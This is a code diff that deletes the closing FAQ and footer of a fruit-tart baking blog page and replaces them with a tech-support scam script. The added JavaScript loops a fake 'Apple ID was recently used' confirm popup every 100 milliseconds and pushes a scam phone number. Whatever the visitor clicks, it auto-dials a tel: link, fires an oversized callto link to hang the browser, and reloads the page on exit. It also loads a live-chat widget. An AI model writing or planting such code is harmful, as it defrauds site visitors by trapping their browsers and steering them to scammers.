-      <p>Yes — but replace no more than 30% of the all-purpose flour. Whole wheat absorbs more liquid, so add an extra tablespoon of water per 100g of flour.</p>
-    </div>
-    <div class="faq-item">
-      <h4 style="font-family:var(--font-serif);">❓ How do I prevent a soggy bottom?</h4>
-      <p>Preheat your baking stone or steel for 45 minutes. And sprinkle a thin layer of fine semolina or ground nuts under the fruit.</p>
-    </div>
-    <p><strong>Expert advice:</strong> “Treat your dough as if it were a living thing. It breathes, it rests, it responds to temperature. The best tarts are those that have been given time.” — Our head baker, <em>Elias Voss</em>.</p>
-    <p style="margin-top:2rem;">This is just the beginning. In our next article, we explore the role of acidity in balancing sweetness, and why a pinch of citric acid can elevate a plum tart to something unforgettable.</p>
-  </article>
 
-  <!-- FOOTER : unique with policy links and brand -->
-  <footer>
-    <div>
-      <div class="brand"><span class="brand-icon">🍂</span> Kingdom Pastry Orchard</div>
-      <p style="max-width:260px; margin-top:0.8rem; color:var(--fig);">A wild orchard kitchen where fruit, flour, and fire converge. Since 2020.</p>
-      <p style="font-size:0.8rem; color:var(--sage);">© 2026 · All rights reserved.</p>
-    </div>
-    <div class="footer-col">
-      <h5>Explore</h5>
-      <a href="#">Blog</a>
-      <a href="#">Categories</a>
-      <a href="#">Authors</a>
-      <a href="#">Archive</a>
-    </div>
-    <div class="footer-col">
-      <h5>Information</h5>
-      <a href="#">About</a>
-      <a href="#">Contact</a>
-      <a href="#">Editorial Policy</a>
-      <a href="#">Resources</a>
-    </div>
-    <div class="footer-col">
-      <h5>Legal</h5>
-      <a href="#">Privacy Policy</a>
-      <a href="#">Terms & Conditions</a>
-      <a href="#">Cookie Policy</a>
-      <a href="#">Disclaimer</a>
-      <a href="#">Sitemap</a>
-    </div>
-  </footer>
-</div>
-</body>
-</html>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-481-2925');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-481-2925"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-481-2925 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
